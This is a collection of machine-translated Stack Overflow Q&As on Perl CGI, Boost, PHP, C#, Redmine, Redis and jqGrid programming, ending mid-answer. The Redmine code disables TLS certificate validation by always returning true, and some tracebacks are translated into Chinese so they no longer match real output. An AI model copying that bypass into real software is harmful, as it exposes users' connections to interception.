<script type="text/javascript">
function reveal(value)
     document.getElementById("outputtext").value += value;
 }
</script>
<table>
  <tr>
    <td><textarea id="outputtext"></textarea></td>
  </tr></table>
</body>
</html> 
```

# perl - 注册：Perl CGI 脚本自动更新新数据

> ID：10597184
> 
> 赞同：1
> 
> 时间：2012-05-15T08:49:33.053
> 
> 标签：perl

嗨这个脚本需要 3*2 秒的时间，然后立即在浏览器中打印输出，帮助重新

```
#!C:/perl/bin/perl.exe
use warnings;
use strict;
use CGI;

my $cgi = new CGI;
print $cgi->header();
print $cgi->start_html("First");
print $cgi->h1("First");
sleep(2);
print $cgi->h1("Second");
sleep(2);
print $cgi->h1("Third");
print $cgi->end_html(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T08:54:28.700

您可以设置`$| = 1;`在每次打印时刷新输出缓冲区，但看起来[Apache 会等待脚本完成运行](http://www.perlmonks.org/?node_id=150578)后再返回任何内容，因此您可能需要将睡眠逻辑移动到客户端 JavaScript 中。

# c++ - 我如何从 boost::streambuf 读取指针数据但没有复制数据

> ID：10597187
> 
> 赞同：0
> 
> 时间：2012-05-15T08:49:42.673
> 
> 标签：c++, boost, stl

我有一个流缓冲区，我需要发送我知道存在的 n 个数据（从 writer 获取）我可以使用 belo 语法：

```
streambuf b;
chat mybuf[1024]
std::istream is(&b);
is.read(mybuf,500); 
```

这样我复制数据。我只想获取指针并避免复制数据。我想发送如下：

```
asio::tcp::socket socket_;
socket_->send( 
```

有没有办法驱动`streambuf`和使用受保护的`gptr`和`gbum，这是一个好方法吗？

我需要做什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T12:29:36.037

`boost::asio::streambuf`只不过是缓冲队列。使用[`streambuf::data()`](http://www.boost.org/doc/libs/1_40_0/doc/html/boost_asio/reference/basic_streambuf/data.html). 它返回一个缓冲区列表，代表已[提交](http://www.boost.org/doc/libs/1_40_0/doc/html/boost_asio/reference/basic_streambuf/commit.html)的缓冲区。成功发送/写入后[`streambuf::consume(size_t)`](http://www.boost.org/doc/libs/1_40_0/doc/html/boost_asio/reference/basic_streambuf/consume.html)用于删除/重用缓冲区。

```
streambuf b;
size_t size;
size= read( _socket, b.prepare( 1024 ) ); 
b.commit( size );   // after this function you may call read again
size= write( socket_, b.data() ); // you can check size() if there is anything
b.consume(size);  // remove size bytes from data() buffers 
```

# php - 连接 PHP-informix-ubuntu 11.10

> ID：10597188
> 
> 赞同：1
> 
> 时间：2012-05-15T08:49:43.693
> 
> 标签：php, sql, ubuntu, informix, ubuntu-11.10

我正在尝试在 ubuntu 11.10 上配置 PHP-informix 环境。我安装了 PDO 和 pdo_sqlite 和 soap，但我无法安装 pdo_informix。我不知道下一步是什么。

![在此处输入图像描述](../Images/7eac012b91459877e3c3984beeb0cc52.png)

当我在 openadmin 工具上检查它时，我得到了这个屏幕截图。我坚持这一步。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-02-09T09:17:16.900

我也挣扎了几天，但最终我做对了。我使用以下步骤创建与 informix DB 的连接：

1.  在 root 用户下创建 PDO 目录。
2.  提取`informix_pdo`目录中的文件。
3.  输入 PDO 目录：`cd PDO_INFORMIX-1.3.1/`.
4.  设置你的`INFORMIXDIR`: `$ export INFORMIXDIR=/myifx/csdk`。
5.  执行`phpize`：`$ phpize`
6.  执行配置： `$ ./configure`。
7.  编译 PDO `$ make`：.
8.  安装 PDO：`$ make install`。
9.  在 PHP 激活 PDO：

```
$ cd /etc/php5/conf.d
$ echo "extension=pdo_informix.so" > pdo_informix.ini

```

10.  重启阿帕奇。
11.  检查 phpinfo 以查看是否加载了 informix_pdo 扩展。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T23:33:08.633

一个可能的问题是环境设置不正确，无法找到 PDO_Informix 使用的 Informix 库。您通常需要 LD_LIBRARY_PATH 来包含 $INFORMIXDIR/lib 和 $INFORMIXDIR/lib/esql。作为替代方案，您也许可以使用或编辑该`ld.so.conf`文件。

您可能会发现您需要设置 $INFORMIXDIR 本身和 $INFORMIXSERVER （或者可能代替）。

# c# - 在 C# 中的列表中搜索

> ID：10597192
> 
> 赞同：0
> 
> 时间：2012-05-15T08:49:52.957
> 
> 标签：c#, .net, c#-4.0

我有一个包含以下结构的列表。

```
class CompareDesignGroup
{
    string FieldId;
    string Caption;
} 
```

该列表包含上述结构的项目。

如果 FieldId 已知，是否可以检索列表的元素？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T08:52:05.347

您可以在通用列表类上使用[Find 方法。](http://msdn.microsoft.com/en-us/library/x0b5b5bc.aspx)find 方法采用一个谓词，可让您过滤/搜索列表中的单个项目。

```
List<CompareDesignGroup> list = // ..;
CompareDesignGroup item = list.Find(c => c.FieldId == "SomeFieldId"); 
```

`item`如果列表中没有匹配项，则为 null。

如果您需要查找多个项目，可以使用[FindAll 方法](http://msdn.microsoft.com/en-us/library/fh1w7y8z)：

```
List<CompareDesignGroup> list = // ..;
List<CompareDesignGroup> result= list.FindAll(c => c.FieldId == "SomeFieldId"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T08:52:01.523

您可以使用`Where`，然后您可以使用`FirstOrDefault`. 那是一个[LINQ](http://en.wikipedia.org/wiki/Language_Integrated_Query)表达式。

```
var ls = new List<CompareDesignGroup>();
var result = ls.Where(a => a.FieldId=="123").FirstOrDefault(); 
```

或者`SingleOrDefault`得到你想要的项目。像这样：

```
var ls = new List<CompareDesignGroup>();
var result = ls.Where(a => a.FieldId=="123").SingleOrDefault() 
```

或者更简单：

```
var result = ls.SingleOrDefault(a => a.FieldId=="123");
var result2 = ls.FirstOrDefault(a => a.FieldId=="123"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T08:52:17.853

是的。使用[LINQ](http://en.wikipedia.org/wiki/Language_Integrated_Query)或`List`.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-15T08:52:47.027

您可以像这样使用 LINQ：

```
CompareDesignGroup result = yourList.FirstOrDefault(x => x.FieldId == yourKnownId); 
```

如果您使用该`FirstOrDefault`方法，`result`则`null`当列表不包含具有已知 ID 的记录时。所以在使用之前`result`检查它是否不是`null`。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-15T09:24:19.907

有很多方法可以在列表中查找项目。

[LINQ](http://msdn.microsoft.com/en-us/library/bb397926)提供了扩展方法，可用于处理不提供自己的搜索功能的集合（或者当您没有集合本身但具有通用接口时`IEnumerable<T>`）。如果您有一个`List<CompareDesignGroup>`对象并且您将处理该对象，您可以使用该类提供的方法（[专用方法几乎总是比 LINQ 方法快](http://codebetter.com/stevehebert/2008/02/06/linq-to-objects-relating-data-structure-organization-to-where-clause-optimization/)，它们知道集合的内部结构并且不必依赖许多抽象层）。

`FieldId`在所有示例中，我将对假设`id`参数执行文化不变量和区分大小写的比较。这可能不是您所需要的，您可能必须根据您的要求进行更改。

## 使用`List<T>`

给定一个声明为的列表：

```
List<CompareDesignGroup>() list = new List<CompareDesignGroup>(); 
```

要查找与搜索条件匹配的**第一个**`null`元素（如果未找到任何项目，它将返回）：

```
CompareDesignGroup item = list.Find(
    x => String.Equals(x.FieldId, id,  StringComparison.InvariantCulture)); 
```

要查找与搜索条件匹配的**所有元素：**

```
List<CompareDesignGroup> items = list.FindAll(
    x => String.Equals(x.FieldId, id,  StringComparison.InvariantCulture)); 
```

## 使用`IEnumerable<T>`（或`IList<T>`，例如）

给定一个声明为的列表：

```
IEnumerable<CompareDesignGroup> list = ... 
```

要查找与搜索条件匹配的**第一个**`null`元素（如果未找到任何项目）：

```
CompareDesignGroup item = list.FirstOrDefault(
    x => String.Equals(x.FieldId, id,  StringComparison.InvariantCulture)); 
```

要查找与搜索条件匹配的**第一个**元素（如果未找到任何项目，则抛出异常）：

```
CompareDesignGroup item = list.First(
    x => String.Equals(x.FieldId, id,  StringComparison.InvariantCulture)); 
```

要查找与搜索条件匹配的**所有元素：**

```
IEnumerable<CompareDesignGroup> item = list.Where(
    x => String.Equals(x.FieldId, id,  StringComparison.InvariantCulture)); 
```

有很多 LINQ 扩展方法，我建议大家都看看，以找到更适合您需求的方法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-15T08:52:48.903

```
List<CompareDesignGroup> listData = new List<CompareDesignGroup>(); // init the data
var result = listData.Where(x=> String.Equals(x.FieldID,"FIELDID KNOWN VALUE"); // gets all data
var first = listData.FirstOrDefault(x=> String.Equals(x.FieldID,"FIELDID KNOWN VALUE"); // gets first search result 
```

# php - 基于Windows登录的PHP登录-SSO

> ID：10597196
> 
> 赞同：0
> 
> 时间：2012-05-15T08:50:09.600
> 
> 标签：php, windows, ldap, single-sign-on, samba

我希望用户根据他们的 Windows 登录在 PHP 中自动进行身份验证。有没有人有一个简单的解决方案。它不需要**非常**安全，因为它是为 Intranet 使用而设计的。

更确切地说 ：

1.  用户在 Windows 中登录（服务器是 samba，但很快就会被 LDAP 取代）

2.  当他打开一个 PHP Web 应用程序时，这个应用程序有一些方法可以根据他的 Windows 登录来识别和验证用户。

这将是一种 SSO。

# java - getChildNodes() 在 XML 中为我的根返回 NULL

> ID：10597197
> 
> 赞同：0
> 
> 时间：2012-05-15T08:50:12.820
> 
> 标签：java, xml, xpath, nodelist

**我的目标：**在对象中获取 XML 的根`Node`，然后评估它！

**我的问题 ：**

我正在尝试从 XML 文件的 ROOT 评估我的表达式，我有这个方法（我需要实现的是）：

```
public Object evaluate(String expression, QName returnType); 
```

假设我已经打开了 XML `Document`，如下所示：

```
 //load the document into a DOM Document
        this.domFactory = DocumentBuilderFactory.newInstance();

        domFactory.setNamespaceAware(true); // never forget this!

        this.builder = domFactory.newDocumentBuilder();
        this.doc = builder.parse("books.xml");

        //create an XPath factory
        this.factory = XPathFactory.newInstance();

        //create an XPath Object
        this.xpath = factory.newXPath(); 
```

现在当我这样做时，里面 `public Object evaluate(String expression, QName returnType);` ：

```
String unitedString = " my characters " ; 
rootNode = doc.getChildNodes().item(0);
System.out.println(rootNode.getNodeName()); // this line presents the name of the root 
Object returnedObject= xpath.evaluate(unitedString,rootNode ,returnType);   // this line makes eclipse go crazy 
```

Eclispe 在 "4" 行之后说：`" DTMManagerDefault.getDTMHandleFromNode(Node) line: not available "` 但是在 "3" 行中，Eclipse 生成了根的名称，即`inventory`...

那么我哪里出错了？

它出什么问题了 ？

谢谢大家，杰克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:41:58.553

第一的：

您的 unitedString 不是有效的 xPath 表达式，它应该类似于 /root/node/ xPath 的描述路径到您的 xml 文件中的 (a) 特定节点。

第二：

任何 xml 的根节点都是一个称为 DocumentElement 的特殊节点，您可以通过调用 doc.getDocumentElement()

# ubuntu - XTK 构建错误 Ubuntu

> ID：10597198
> 
> 赞同：0
> 
> 时间：2012-05-15T08:50:29.343
> 
> 标签：ubuntu, xtk

我使用的是 Ubuntu 12.04，尝试了 32 位和 64 位版本

这是我尝试构建 xtk 时得到的。请帮助如何解决问题

```
george@laptop-4:~/X4/utils$ ./build.py -b -t -e
*------------------------*
编译代码
 /home/george/X4/lib/closure-library/closure/bin/build/closurebuilder.py：扫描路径...
 /home/george/X4/lib/closure-library/closure/bin/build/closurebuilder.py：扫描了 936 个源。
 /home/george/X4/lib/closure-library/closure/bin/build/closurebuilder.py：构建依赖树..
回溯（最近一次通话最后）：
文件“/home/george/X4/lib/closure-library/closure/bin/build/closurebuilder.py”，第 256 行，在
主要的（）
文件“/home/george/X4/lib/closure-library/closure/bin/build/closurebuilder.py”，第 241 行，在 main
options.compiler_flags)
编译中的文件“/home/george/X4/lib/closure-library/closure/bin/build/jscompiler.py”，第 50 行
如果不是 (distutils.version.LooseVersion(_GetJavaVersion()) >=
_GetJavaVersion 中的文件“/home/george/X4/lib/closure-library/closure/bin/build/jscompiler.py”，第 31 行
proc = subprocess.Popen(['java', '-version'], stderr=subprocess.PIPE)
文件“/usr/lib/python2.7/subprocess.py”，第 679 行，在 __init__
读错，写错）
_execute_child 中的文件“/usr/lib/python2.7/subprocess.py”，第 1249 行
引发 child_exception
OSError: [Errno 2] 没有这样的文件或目录
>> 输出：xtk.js
代码编译
*------------------------*
*------------------------*
测试代码

======== 谷歌浏览器结果 ========
回溯（最近一次通话最后）：
  文件“./build.py”，第 177 行，在
    scripts.test.calculate(paths.xtkDir + '/testing/xtk_tests_build.html', paths.xtkLibDir)
  文件“/home/george/X4/utils/scripts/test.py”，第 60 行，在计算中
    显示=显示（可见=0，大小=（1024，768））
  文件“/home/george/X4/lib/PyVirtualDisplay/build/lib.linux-x86_64-2.7/pyvirtualdisplay/display.py”，第 33 行，在 __init__
    self._obj = self.display_class(
  文件“/home/george/X4/lib/PyVirtualDisplay/build/lib.linux-x86_64-2.7/pyvirtualdisplay/display.py”，第 51 行，在 display_class
    cls.check_installed()
  文件“/home/george/X4/lib/PyVirtualDisplay/build/lib.linux-x86_64-2.7/pyvirtualdisplay/xvfb.py”，第 33 行，在 check_installed
    EasyProcess([程序, '-help'], url=URL, ubuntu_package=PACKAGE).check_installed()
  文件“/home/george/X4/lib/EasyProcess/build/lib.linux-x86_64-2.7/easyprocess/__init__.py”，第 201 行，在 check_installed
    引发 EasyProcessCheckInstalledError(self)
easyprocess.EasyProcessCheckInstalledError: cmd=['Xvfb', '-help']
OSError=[Errno 2] 没有这样的文件或目录  
程序安装错误！
您可以在终端中安装它：
sudo apt-get install xvfb

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T12:24:54.773

我还在我的 Ubuntu 下进行了测试，并且遇到了同样的错误并解决了它（顺便说一句编译成功，但之后我没有尝试 lib）

查看错误的结尾：

```
easyprocess.EasyProcessCheckInstalledError: cmd=['Xvfb', '-help']
OSError=[Errno 2] No such file or directory  
Program install error! 
You can install it in terminal:
sudo apt-get install xvfb 
```

他们说“xvfb”丢失了，所以我用“sudo apt-get install xvfb”安装它，然后编译。它对你有用吗？

但是编译后测试出错误：

```
*-----------------------*
Testing code

======== GOOGLE CHROME RESULTS ========
RUNNING OFFSCREEN TESTING..
Traceback (most recent call last):
File "./build.py", line 177, in <module>
scripts.test.calculate( paths.xtkDir + '/testing/xtk_tests_build.html', paths.xtkLibDir )
File "/home/fabien/X_3DNeo/utils/scripts/test.py", line 62, in calculate
chrome_results = runTests( xtkTestFile, xtkLibDir, browserString )
File "/home/fabien/X_3DNeo/utils/scripts/test.py", line 151, in runTests
result = browser.execute_script( 'return window.G_testRunner.getReport(true);' )
File "/home/fabien/X_3DNeo/lib/selenium/selenium/webdriver/remote/webdriver.py", line 385, in execute_script
{'script': script, 'args':converted_args})['value']
File "/home/fabien/X_3DNeo/lib/selenium/selenium/webdriver/remote/webdriver.py", line 153, in execute
self.error_handler.check_response(response)
File "/home/fabien/X_3DNeo/lib/selenium/selenium/webdriver/remote/errorhandler.py", line 147, in check_response
raise exception_class(message, screen, stacktrace)
selenium.common.exceptions.WebDriverException: Message: u"Script execution failed. Script: return window.G_testRunner.getReport(true);;\n Cannot call method 'getReport' of undefined" 
```

# c++ - 编译和执行 Qt 应用程序

> ID：10597199
> 
> 赞同：0
> 
> 时间：2012-05-15T08:50:30.570
> 
> 标签：c++, qt, user-interface, compiler-construction

我开始学习Qt。我有这个代码片段，我想知道如何编译它并在 gcc 中执行。平台：Linux，gcc编译器

```
 1 #include <QtGui>
  2 
  3 int main(int argc, char *argv[])
  4 {
  5         QApplication app(argc, argv);
  6         QLabel label("Hello, world!");
  7         label.show();
  8 
  9         return app.exec();
 10 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:09:53.053

在这里很好地解释了这一点：http: [//qt-project.org/doc/qt-4.8/gettingstartedqt.html](http://qt-project.org/doc/qt-4.8/gettingstartedqt.html)

它基本上归结为

```
qmake -project
qmake
make 
```

另外我**真的**推荐安装和使用 QtCreator：http: [//qt-project.org/downloads](http://qt-project.org/downloads)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:11:54.947

在您的情况下，这非常简单，因为您没有派生任何窗口、按钮或其他小部件。

通常用于制作 QT 应用程序。您需要执行以下操作：

1.  将带注释的标头编译为元对象 C++ 代码。您可以通过运行元对象编译器 (MOC) 来做到这一点。

2.  编译您的源文件以及 MOC 生成的源文件。

3.  将所有文件与 QT 库链接在一起。

在您的情况下，您不需要第 1 步和第 2 步，因此第 3 步就足够了。只需找出必要的库所在的位置并将它们与已编译的`main`.

所有这一切都是假设您不想使用`qmake`QT 提供的，它可以自动执行这三个步骤。

# objective-c - 单例、方法和变量

> ID：10597208
> 
> 赞同：0
> 
> 时间：2012-05-15T08:50:47.297
> 
> 标签：objective-c, singleton

我只想回答这个问题，我知道变量是可能的，但是方法？

对于单身人士，我可以在项目的任何地方使用方法+变量吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T08:54:48.763

单例只不过是一个类的全局实例。一旦你在项目的任何地方获得了实例，你就应该对它做任何你想做的事情，就像对任何其他类实例一样。显然，**您可以访问它的公共变量和方法**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T08:51:45.407

**是**的，您不必创建实例来访问您的单例方法。

# web-services - Web 服务适用于哪种集成风格？

> ID：10597211
> 
> 赞同：0
> 
> 时间：2012-05-15T08:50:49.903
> 
> 标签：web-services, integration, messaging

我目前正在考虑集成样式。遵循 Gregor Hohpe 和 Bobby Woolf (http://eaipatterns.com/) 的基本集成风格是

*   文件传输
*   共享数据库
*   远程过程调用
*   消息传递

我理解。但是 WebServices 通常适用于这些样式中的哪一个？例如，REST 是否会是一种文件传输样式，因为它用于通过 HTTP 传输资源？我猜 SOAP RPC 适用于远程过程调用，但非 RPC SOAP 呢？WebServices 甚至可以应用于消息传递，即 SOAP over MQ，对吧？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T04:16:19.410

REST 调用基本上是远程过程调用，因为它们是执行方法调用的轻量级方式。

诸如 SOAP over MQ 之类的消息传递意味着将 REST 视为一种传输，就像 TCP 上的二进制协议是一种传输一样。

通过 HTTP 进行的文件传输，其中文件是普通文件（不是 XML 或 JSON）不被视为 REST 调用。

# c# - 如何通过 .NET 的 https 使用 Redmine REST API？

> ID：10597217
> 
> 赞同：0
> 
> 时间：2012-05-15T08:51:21.277
> 
> 标签：c#, .net, redmine

我们内部的 Redmine 服务器只允许我通过 HTTPS 连接。以下是我尝试通过 .NET 中的 HTTPS 使用 REST API 的方法：

1.  正如*[将 REST API 与 .NET 一起使用中](http://www.redmine.org/projects/redmine/wiki/Rest_api_with_csharp)*所建议的那样，将主机变量设置为`"https://redmine.company.com/redmine/"`，将 apiKey 设置为`"ffffffffffffffffffffffffffffffffffffffff"`.
2.  使用以下代码从头开始：

    ```
    using System.IO;
    using System.Net;

    class Program
    {
        static void Main(string[] args)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, error) => true;

            var request = (HttpWebRequest)WebRequest.Create(
                "https://redmine.company.com/redmine/issues/149.xml?key=ffffffffffffffffffffffffffffffffffffffff");
            request.CookieContainer = new CookieContainer();
            request.Method = "GET";

            using (var response = request.GetResponse()) // Hangs here
            using (var responseStream = response.GetResponseStream())
            using (var memoryStream = new MemoryStream())
            {
                responseStream.CopyTo(memoryStream);
            }
        }
    } 
    ```

当然，`company.com`并且`ffffffffffffffffffffffffffffffffffffffff`只是我的真实公司的占位符和我的帐户页面上的真实 API 密钥。两次尝试都会挂起一段时间，然后出现 WebException 超时（请参阅尝试 2 中的*Hangs here*评论）。然后我尝试从 Redmine 服务器下载其他内容（例如 time_entries.csv、atom feed 等），每次都得到完全相同的结果。

到目前为止很糟糕。但是，如果我将 URL 复制粘贴`https://redmine.company.com/redmine/issues/149.xml?key=ffffffffffffffffffffffffffffffffffffffff`到浏览器中，我会得到我期望的响应。因此，似乎我们的 Redmine 服务器表现得如其所愿，但不知何故，我无法让它在 .NET 上工作。

我已经成功地从其他 HTTPS 站点下载了东西，并设法从[http://demo.redmine.org](http://demo.redmine.org)下载了带有尝试 2 代码的问题数据（当然还有经过调整的 URL 等）。因此，Redmine 如何通过 HTTPS 进行通信似乎有些特别之处。

如果有人通过 .NET 的 HTTPS 成功使用 Redmine REST API，我将非常感谢一些关于我做错了什么的指示。

此外，将不胜感激有关如何从客户端进行调试的建议。到目前为止，我已经尝试过 Fiddler2，但没有成功。一旦我启用它的“解密 HTTPS 流量”设置，当我在 Internet Explorer 中发出请求时，我就不再得到答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T16:12:36.130

我们使用[redmine-net-api](http://code.google.com/p/redmine-net-api/ "redmine-net-api")，它支持基于 API 密钥的 HTTP/S 连接和身份验证。

```
 RedmineManager rm = new RedmineManager("https://<your-address>", <api-key>, "random-password");
        IList<Issue> issues = rm.GetObjectList<Issue>(new NameValueCollection() { { "project_id", <project-id> } }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-26T11:23:47.823

参数的显式传递`SecurityProtocolType.Tls12`值`securityProtocolType`解决了我的问题：

```
RedmineManager redmineManager = new RedmineManager(_host, _apiKey, 
    securityProtocolType: SecurityProtocolType.Tls12); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-02T07:40:55.323

试试这个，它对我有用：

```
// Allow every secure connection
ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, error) => true;

// Create redmine manager (where URL is "https://10.27.10.10/redmine" for me and redmineKey is my redmine API key
RedmineManager redmineManager = new RedmineManager(redmineURL, redmineKey);

// Create your query parameters
NameValueCollection queryParameters = new NameValueCollection { { "project_id", "4" }, {"tracker_id", "17"}, { "offset", "0" } };

// Perform your query
int issuesFound = 0;
foreach (var issue in redmineManager.GetObjectList<Issue>(queryParameters, out issuesFound))
{
// By default you get the 25 first issues of the project_id and tracker_id specified.
// Play with the offset to get the rest
queryParameters["offset"] = ....
} 
```

# websphere - 在哪里可以找到 RAD 8（基于 Eclipse）的管理控制台？

> ID：10597220
> 
> 赞同：0
> 
> 时间：2012-05-15T08:51:44.217
> 
> 标签：websphere, ibm-rad

如何打开内置于 IBM RAD 8 的 WAS 8 管理控制台？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-12T09:43:19.843

右键单击服务器 --> 管理 --> 运行管理控制台

# c# - Redis serviceStack 池化连接客户端

> ID：10597223
> 
> 赞同：9
> 
> 时间：2012-05-15T08:51:50.213
> 
> 标签：c#, redis, servicestack

我正在设计一个使用 Redis 作为数据库的 Web 服务，我想知道使用 Redis 连接 StackService 客户端的最佳实践。

关键是我一直在阅读有关 Redis 的文章，我发现与服务器交互的最佳方式是使用单个并发连接。

问题是，尽管每次 Web 客户端向 Web 服务发出请求时我都使用**PooledRedisClientManager** ，但我得到了一个与 redis 服务器连接的客户端（打开的连接），并且连接客户端的数量会增加而不会限制消耗更多和更多的记忆。

**示例“故障”代码：**

```
PooledRedisClientManager pooledClientManager = new PooledRedisClientManager("localhost");
var redisClient = pooledClientManager.GetClient();
using (redisClient)
{
   redisClient.Set("key1", "value1");
} 
```

我为解决这个问题所做的是创建一个使用静态变量实现单例模式的类`RedisClient`；如果`redisClient`未初始化，则创建一个新的，如果是，则返回已初始化的。

**解决方案：**

```
public class CustomRedisPooledClient
{
    private static CustomRedisPooledClient _instance = null;
    public RedisClient redisClient = null;

    // Objeto sincronización para hacer el Lock 
    private static object syncLock = new object();

    private CustomRedisPooledClient()
    {
        redisClient = new RedisClient("localhost");
    }

    public static CustomRedisPooledClient GetPooledClient()
    {
        if (_instance == null)
        {
            lock (syncLock)
            {
                if (_instance == null)
                {
                    _instance = new CustomRedisPooledClient();
                }
            }
        }
        return _instance;
    }
}

CustomRedisPooledClient customRedisPooledClient = CustomRedisPooledClient.GetPooledClient();
using (customRedisPooledClient.redisClient)
{
    customRedisPooledClient.redisClient.Set("key1", "value1");
} 
```

这是一个好习惯吗？

先感谢您！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-15T10:51:30.597

我用过`PooledRedisClientManager`，效果很好：

**我只运行一次的**示例代码：

```
static PooledRedisClientManager pooledClientManager = new PooledRedisClientManager("localhost"); 
```

和我在许多线程上运行的代码：

```
var redisClient = pooledClientManager.GetClient();
using (redisClient)
{
    redisClient.Set("key" + i.ToString(), "value1");
} 
```

我只有 11 个客户端连接到服务器。

# php - php将图片添加到另一个

> ID：10597227
> 
> 赞同：0
> 
> 时间：2012-05-15T08:52:04.670
> 
> 标签：php, gd

我想用php改变图像的颜色。如果我想让它看起来更红 applicherei 一个更高级别的图像，一个透明红色的图像和或多或少的高可以指示原始照片应该如何是红色的。我可以说 gd php 函数来创建颜色 (RGBA) 的图像并将其应用于另一个图像？谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:57:44.513

您可以尝试使用 GD 的 imagecopymerge 功能，该功能将一张图像复制到另一张图像并支持 alpha 透明度。像这样的东西应该工作：

```
<?php
$redimg = imagecreatetruecolor(100, 100);
$image = imagecreatefrompng('image.png');

// sets background to red
$red = imagecolorallocate($redimg, 255, 0, 0);
imagefill($redimg, 0, 0, $red);

// Merge the red image onto the PNG image
imagecopymerge($image, $redimg, 0, 0, 0, 0, 100, 100, 75);

header('Content-type: image/png');
imagepng($image);
imagedestroy($image);
imagedestroy($redimg);
?> 
```

[这里](http://nl.php.net/manual/en/function.imagecopymerge.php)有更多信息。

# sorting - 首先 Jqgrid 在 IE6 中加载、排序和过滤很慢。在其他浏览器中过滤缓慢

> ID：10597232
> 
> 赞同：0
> 
> 时间：2012-05-15T08:52:14.640
> 
> 标签：sorting, jqgrid, load, filtering

我正面临这种情况。我有一个大约 3500 行的网格。而且这个网格应该是跨浏览的，特别是在 IE6 中（这是客户端的浏览器......不幸的是）。

当我在 IE6 中进行测试时，加载时间比其他浏览器要多。看到这个后，我决定优化查询，现在它只加载必要的数据库字段，但在 IE 中加载仍然很慢。我的数据类型是`JSON`.

除了这种不便之外，我发现所有浏览器的过滤速度都很慢（在 IE6 中比其他浏览器花费更多时间）。我在过滤器中使用了选项`searchOnEnter : false`，在 IE6 中按列排序也很慢。

当我使用按列过滤和排序时，我可以做些什么来减少加载时间？我仍在网上冲浪，试图找到一个可能的解决方案，但我的想法已经不多了。

提前致谢。

**更新**：jQGrid代码

```
var myGrid = $('#bookingsList');
myGrid.jqGrid({
    jsonReader : { root: "rows", repeatitems: false, id: "0", cell: ""},
    url:'/WebBooking/json/bookingListAct.action',
    datatype: 'json',
    mtype: 'POST',
    colNames:['Id','Site','CompanyId','Created'],
    colModel :[
    {name:'bestillingId', index:'bestillingId', width:45, sorttype: 'int'}, 
    {name:'stedName', index:'stedName', width:90},
    {name:'firmaId', index:'firmaId', width:200, hidden:true}, 
    {name:'creationDate', index:'creationDate', width:105, search:false}
    ],
    pager: '#pager',
    rowNum:10,
    rowList:[10,50,100,150,200,250,500],
    sortname: 'bestillingId',
    sortorder: 'desc',
    viewrecords: true,
    gridview: true,
    loadonce: true,
    sortable: true,
    rownumbers: true,
    autoencode: true,
    ignoreCase: true,
    shrinkToFit:false,
    width: 1050,
    height: '100%'
}); 
```

**更新**：JSON字符串（一部分）

`{"page":"1","records":"3180","rows":[{"stedName":"Mongstad","bestillingId":"2","firmaName":"Reinertsen AS","creationDate":"13.09.11 09:01"}],"total":"318"}`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:23:38.327

当前代码中的主要问题是`loadonce: true`. 在这种情况下，实现`url:'/WebBooking/json/bookingListAct.action'`非常简单：您只将*所有数据*返回到 jqGrid。尽管如此，在您应该对数据进行排序的情况下，这些事件`sortname: 'bestillingId'`将`sortorder: 'desc'`在服务器上（在 中`bookingListAct.action`）作为`sidx`和`sord`参数显示。

您应该了解，在使用的情况下，`loadonce: true`数据的排序、分页和过滤将在客户端以 JavaScript 代码实现。您如何知道 JavaScript 主要是解释器，并且不会编译代码（至少在旧的 Web 浏览器中）。因此，在客户端对数据的排序比在服务器上编译的本机代码慢很多倍（或数千倍）。如果您将数据保存在数据库中并且在您允许排序或过滤的列上有索引，那么在服务器端实现中排序和过滤将更快。

所以我的主要建议是实现**服务器端排序、分页和过滤**。

要在服务器端实现排序，您应该在相应的 SQL语句`sidx`中`sord`构造。`ORDER BY``SELECT`

要在服务器端实现分页，您应该使用来自`page`和`rows`参数的信息。您可以使用`SELECT TOP`and`LEFT OUTER JOIN`或`LIMIT`and`SKIP`取决于您使用的 SQL 方言（请参阅[此处](https://stackoverflow.com/a/8480127/315935)）一些详细信息。

要实现过滤，您应该首先使用[filterToolbar](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:toolbar_searching#calling_convention)`stringResult: true`选项来获取有关要以高级搜索格式发送的过滤器的信息（请参阅[此处](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:advanced_searching#options)）。JSON 字符串形式的完整过滤器将作为参数发送到服务器。此外，它将发送布尔参数。在服务器端，您应该将参数从 JSON 字符串转换为对象并解析信息。然后你应该使用这些信息来构造相应语句的一部分。`filters``_search``filters``WHERE``SELECT`

If all information sorting, paging and filtering are exist in the request to the server then you should first filter the data, sort the results and the get the requested page from the results. The `records` and `total` values in the server response should take in the consideration the filtering. So if the filtered data consists for example from 12 rows and the page size is 10 you should return `"records": 12, "total": 2` instead of `"records": 3180, "total": 318` which you have in unfiltered data.

I don't use Java myself. I am not sure whether it helps you but in [the answer](https://stackoverflow.com/a/5501644/315935) you will find and download Visual Studio C# project which implement paging, sorting and filtering.

The last remark. The row of data which you returns from the server currently looks like

```
{"stedName":"Mongstad","bestillingId":"2","firmaName":"Reinertsen AS",
    "creationDate":"13.09.11 09:01"} 
```
